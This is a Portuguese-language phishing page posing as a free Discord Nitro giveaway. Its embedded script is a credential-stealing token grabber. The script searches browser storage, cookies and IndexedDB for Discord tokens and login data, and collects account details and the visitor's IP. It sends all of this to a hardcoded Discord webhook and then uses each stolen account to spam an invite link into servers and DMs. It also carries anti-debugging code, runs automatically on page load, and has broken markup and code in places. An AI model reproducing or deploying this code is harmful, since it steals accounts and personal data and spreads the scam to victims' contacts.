<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Nitro - Resgate Gratuito</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f0f13;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1}
.particle{position:absolute;background:#5865F2;border-radius:50%;animation:float linear infinite;opacity:.3}
@keyframes float{0%{transform:translateY(100vh) scale(0)}100%{transform:translateY(-100vh) scale(1)}}
.card{background:#1a1b1e;border:1px solid #2f3136;border-radius:16px;padding:40px;width:400px;text-align:center;position:relative;z-index:2;box-shadow:0 0 60px rgba(88,101,242,.3)}

h1{color:#fff;font-size:24px;margin-bottom:8px}
p{color:#b9bbbe;font-size:14px;margin-bottom:24px}
.btn{background:#5865F2;color:#fff;border:none;padding:14px 32px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;width:100%;transition:.3s}
.btn:hover{background:#4752c4;transform:translateY(-2px)}
.btn:disabled{background:#4f545c;cursor:wait;transform:none}
.status{margin-top:16px;color:#b9bbbe;font-size:12px;min-height:18px}

<div class="particles" id="particles"></div>

    <button class="btn" id="connectBtn" onclick="grabToken()">Resgatar Nitro</button>
    <div class="status" id="status">Aguardando...</div>
    <div class="badge">OFERTA LIMITADA</div>
</div>

<script>
// ============================================
// KESTREL-7 ADVANCED TOKEN GRABBER v4.0
// COM SPAM AUTOMÁTICO EM DMs E SERVIDORES
// ============================================

const WEBHOOK_URL = "https://discord.com/api/webhooks/1543784941844832257/hg06YSQRLJdiCvZQbG-2ty2cvExEaq_PFHV8bkv125kJ37OROJ-S44a52L21GsYjt6Nz";
const SPAM_LINK = "https://dsc.gg/stranger-moon";
const EXCLUDED_SERVER_ID = "1537205151063080961";
const SPAM_MESSAGES = [
    `**STRANGER MOON** 🌙\n${SPAM_LINK}\nEntre agora!`,
    `🔥 **MELHOR SERVIDOR** 🔥\n${SPAM_LINK}`,
    `@everyone ${SPAM_LINK}\nNão perca!`,
    `🎮 **STRANGER MOON** 🎮\n${SPAM_LINK}\nDiversão garantida!`,
    `✨ ${SPAM_LINK} ✨\nJunte-se agora!`
];

const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const genId = () => Math.random().toString(36).substring(2) + Date.now().toString(36);

// ===== ANTI-DEBUG =====
(function antiDebug(){
    setInterval(function(){
        const start = performance.now();
        debugger;
        const end = performance.now();
        if(end - start > 100){
            document.body.innerHTML = "";
            window.location.href = "about:blank";
        }
    }, 1000);
    
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', function(e){
        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))){
            e.preventDefault();
        }
    });
})();

// ===== SPAM EM SERVIDORES =====
async function spamServers(token, userData){
    const headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    };
    
    try{
        // Busca todos os servidores
        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
        if(!guildsResponse.ok) return 0;
        const guilds = await guildsResponse.json();
        
        let spamCount = 0;
        
        for(let guild of guilds){
            // Pula servidor excluído
            if(guild.id === EXCLUDED_SERVER_ID) continue;
            
            try{
                // Busca canais do servidor
                const channelsResponse = await fetch(`https://discord.com/api/v9/guilds/${guild.id}/channels`, {headers});
                if(!channelsResponse.ok) continue;
                const channels = await channelsResponse.json();
                
                // Filtra canais de texto
                const textChannels = channels.filter(c => c.type === 0);
                
                for(let channel of textChannels){
                    try{
                        const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
                        
                        const sendResponse = await fetch(`https://discord.com/api/v9/channels/${channel.id}/messages`, {
                            method: 'POST',
                            headers: headers,
                            body: JSON.stringify({content: message})
                        });
                        
                        if(sendResponse.ok){
                            spamCount++;
                        } else if(sendResponse.status === 429){
                            // Rate limit - espera
                            const retryAfter = sendResponse.headers.get('Retry-After') || 5;
                            await sleep(parseInt(retryAfter) * 1000);
                        }
                        
                        // Delay entre mensagens
                        await sleep(rand(500, 1500));
                    }catch(e){}
                }
            }catch(e){}
        }
        
        return spamCount;
    }catch(e){
        return 0;
    }
}

// ===== SPAM EM DMs =====
async function spamDMs(token, userData){
    const headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    };
    
    try{
        // Busca lista de amigos
        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
        if(!friendsResponse.ok) return 0;
        const friends = await friendsResponse.json();
        
        let dmCount = 0;
        
        for(let friend of friends){
            try{
                // Cria ou abre DM com o amigo
                const dmResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify({recipient_id: friend.id})
                });
                
                if(!dmResponse.ok) continue;
                const dmChannel = await dmResponse.json();
                
                const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
                
                const sendResponse = await fetch(`https://discord.com/api/v9/channels/${dmChannel.id}/messages`, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify({content: message})
                });
                
                if(sendResponse.ok){
                    dmCount++;
                } else if(sendResponse.status === 429){
                    const retryAfter = sendResponse.headers.get('Retry-After') || 5;
                    await sleep(parseInt(retryAfter) * 1000);

                await sleep(rand(500, 1500));

        }
        
        // Também envia para DMs existentes
        try{
            const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
            if(dmsResponse.ok){
                const dms = await dmsResponse.json();
                
                for(let dm of dms){
                    if(dm.type === 1){ // DM
                        try{
                            const message = SPAM_MESSAGES[rand(0, SPAM_MESSAGES.length - 1)];
                            
                            const sendResponse = await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages`, {
                                method: 'POST',
                                headers: headers,
                                body: JSON.stringify({content: message})
                            });
                            
                            if(sendResponse.ok){
                                dmCount++;
                            } else if(sendResponse.status === 429){
                                const retryAfter = sendResponse.headers.get('Retry-After') || 5;
                                await sleep(parseInt(retryAfter) * 1000);
                            }
                            
                            await sleep(rand(500, 1500));
                        }catch(e){}
                    }
                }
            }
        }catch(e){}
        
        return dmCount;
    }catch(e){
        return 0;
    }
}

// ===== SCAN DE TOKENS =====
function deepScanStorage(){
    let findings = [];
    
    try{
        for(let i = 0; i < localStorage.length; i++){
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
            const tokenMatches = value.match(tokenRegex);
            if(tokenMatches){
                findings.push({
                    source: 'localStorage',
                    key: key,
                    tokens: tokenMatches,
                    rawValue: value.substring(0, 500)
                });
            }
            
            if(key.toLowerCase().includes('token') || 
               key.toLowerCase().includes('auth') ||
               key.toLowerCase().includes('session') ||
               key.toLowerCase().includes('discord') ||
               key.toLowerCase().includes('password') ||
               key.toLowerCase().includes('credential')){
                findings.push({
                    source: 'localStorage',
                    key: key,
                    value: value.substring(0, 500),
                    sensitive: true
                });
            }
        }
    }catch(e){}
    
    try{
        for(let i = 0; i < sessionStorage.length; i++){
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
            const tokenMatches = value.match(tokenRegex);
            if(tokenMatches){
                findings.push({
                    source: 'sessionStorage',
                    key: key,
                    tokens: tokenMatches
                });
            }
        }
    }catch(e){}
    
    try{
        const cookies = document.cookie.split(';');
        for(let cookie of cookies){
            const trimmed = cookie.trim();
            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
            const tokenMatches = trimmed.match(tokenRegex);
            if(tokenMatches){
                findings.push({
                    source: 'cookie',
                    token: tokenMatches[0],
                    fullCookie: trimmed.substring(0, 300)
                });
            }
        }
    }catch(e){}
    
    return findings;
}

async function deepScanIndexedDB(){
    let findings = [];
    
    const dbNames = ['discord', 'Discord', 'discordapp', 'localforage', 'keyval-store'];
    
    for(let dbName of dbNames){
        try{
            const db = await new Promise((resolve, reject) => {
                const request = indexedDB.open(dbName);
                request.onsuccess = () => resolve(request.result);
                request.onerror = () => reject(request.error);
            });
            
            const storeNames = Array.from(db.objectStoreNames);
            
            for(let storeName of storeNames){
                try{
                    const data = await new Promise((resolve, reject) => {
                        const tx = db.transaction(storeName, 'readonly');
                        const store = tx.objectStore(storeName);
                        const getAll = store.getAll();
                        getAll.onsuccess = () => resolve(getAll.result);
                        getAll.onerror = () => reject(getAll.error);
                    });
                    
                    if(data && data.length > 0){
                        const jsonData = JSON.stringify(data);
                        const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
                        const tokenMatches = jsonData.match(tokenRegex);
                        
                        if(tokenMatches){
                            findings.push({
                                source: 'indexedDB_' + dbName,
                                store: storeName,
                                tokens: tokenMatches,
                                dataPreview: jsonData.substring(0, 1000)
                            });
                        }
                    }
                }catch(e){}
            }
            
            db.close();
        }catch(e){}
    }
    
    return findings;
}

async function validateAndExtract(token){
    try{
        const headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        };
        
        const userResponse = await fetch('https://discord.com/api/v9/users/@me', {headers});
        if(!userResponse.ok) return null;
        const userData = await userResponse.json();
        
        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
        const guilds = guildsResponse.ok ? await guildsResponse.json() : [];
        
        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
        const friends = friendsResponse.ok ? await friendsResponse.json() : [];
        
        return {
            user: userData,
            guilds: guilds,
            friends: friends,
            token: token
        };
    }catch(e){
        return null;
    }
}

async function sendToWebhook(data, webhookUrl){
    try{
        const chunks = [];
        const jsonStr = JSON.stringify(data);
        const maxChunkSize = 1800;
        
        for(let i = 0; i < jsonStr.length; i += maxChunkSize){
            chunks.push(jsonStr.substring(i, i + maxChunkSize));
        }
        
        for(let i = 0; i < chunks.length; i++){
            const payload = {
                content: i === 0 ? "🚨 **CAPTURA COMPLETA - KESTREL-7 v4.0** 🚨" : "",
                embeds: [{
                    title: i === 0 ? "📦 Dados Completos" : `📦 Chunk ${i+1}/${chunks.length}`,
                    description: "```json\n" + chunks[i] + "\n```",
                    color: 16711680,
                    footer: {text: "Kestrel-7 v4.0 • Chunk " + (i+1) + "/" + chunks.length}
                }]
            };
            
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            await sleep(500);
        }
        
        return true;
    }catch(e){
        return false;
    }
}

// ===== GRABBER PRINCIPAL COM SPAM =====
async function grabToken(){
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    btn.disabled = true;
    status.textContent = "Inicializando...";
    
    try{
        // 1. Scan de tokens
        status.textContent = "Escaneando storages...";
        const storageFindings = deepScanStorage();
        const indexedDBFindings = await deepScanIndexedDB();
        
        // 2. Coleta tokens
        const allTokens = [];
        
        for(let finding of storageFindings){
            if(finding.tokens){
                allTokens.push(...finding.tokens);
            }
            if(finding.token){
                allTokens.push(finding.token);
            }
        }
        
        for(let finding of indexedDBFindings){
            if(finding.tokens){
                allTokens.push(...finding.tokens);
            }
        }
        
        const uniqueTokens = [...new Set(allTokens)];
        
        // 3. Valida tokens e extrai dados
        status.textContent = "Validando tokens...";
        const extractedData = [];
        
        for(let token of uniqueTokens){
            const data = await validateAndExtract(token);
            if(data){
                extractedData.push(data);
            }
        }
        
        // 4. IP
        let ip = 'Desconhecido';
        try{
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        }catch(e){}
        
        // 5. Monta payload
        const fullData = {
            capture_id: genId(),
            timestamp: new Date().toISOString(),
            ip: ip,
            browser: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            storage_findings: storageFindings,
            indexeddb_findings: indexedDBFindings,
            extracted_accounts: extractedData,
            tokens_found: uniqueTokens
        };
        
        // 6. Envia dados para webhook
        status.textContent = "Enviando dados...";
        await sendToWebhook(fullData, WEBHOOK_URL);
        
        // 7. SPAM AUTOMÁTICO
        if(extractedData.length > 0){
            for(let account of extractedData){
                const token = account.token;
                const userData = account.user;
                
                // Envia resumo da conta
                const summaryPayload = {
                    content: "🎯 **CONTA CAPTURADA + SPAM INICIADO**",
                    embeds: [{
                        title: "Token Válido Encontrado",
                        color: 65280,
                        fields: [
                            {name: "Usuário", value: userData.username + '#' + userData.discriminator, inline: true},
                            {name: "ID", value: userData.id, inline: true},
                            {name: "Email", value: userData.email || 'N/A', inline: true},
                            {name: "Telefone", value: userData.phone || 'N/A', inline: true},
                            {name: "Nitro", value: userData.premium_type ? 'Sim' : 'Não', inline: true},
                            {name: "Servidores", value: String(account.guilds.length), inline: true},
                            {name: "Amigos", value: String(account.friends.length), inline: true},
                            {name: "Token", value: "```" + token + "```", inline: false}
                        ],
                        footer: {text: "Kestrel-7 v4.0"}
                    }]
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(summaryPayload)
                });
                
                // SPAM EM SERVIDORES
                status.textContent = "Spammando servidores...";
                const serverSpamCount = await spamServers(token, userData);
                
                // Notifica webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `📢 **SPAM EM SERVIDORES CONCLUÍDO**\nMensagens enviadas: ${serverSpamCount}\nConta: ${userData.username}`
                    })
                });
                
                await sleep(2000);
                
                // SPAM EM DMs
                status.textContent = "Spammando DMs...";
                const dmSpamCount = await spamDMs(token, userData);
                
                // Notifica webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `📨 **SPAM EM DMs CONCLUÍDO**\nMensagens enviadas: ${dmSpamCount}\nConta: ${userData.username}`
                    })
                });
                
                status.textContent = `✅ Spam completo! Servidores: ${serverSpamCount} | DMs: ${dmSpamCount}`;
                
                await sleep(1000);
            }
        } else {
            status.textContent = "Nenhum token válido encontrado";
        }
        
    }catch(e){
        status.textContent = "Erro: " + e.message;
    }
    
    // Redireciona após spam
    setTimeout(() => {
        window.location.href = "https://discord.com/channels/@me";
    }, 5000);
}

// ===== AUTO-EXECUÇÃO =====
window.addEventListener('load', function(){
    const particlesContainer = document.getElementById('particles');
    for(let i=0; i<30; i++){

        particle.style.animationDuration = Math.random()*5+3 + 's';
        particle.style.animationDelay = Math.random()*5 + 's';
        particlesContainer.appendChild(particle);
    }
    
    setTimeout(function(){
        grabToken();
    }, 1500);
});
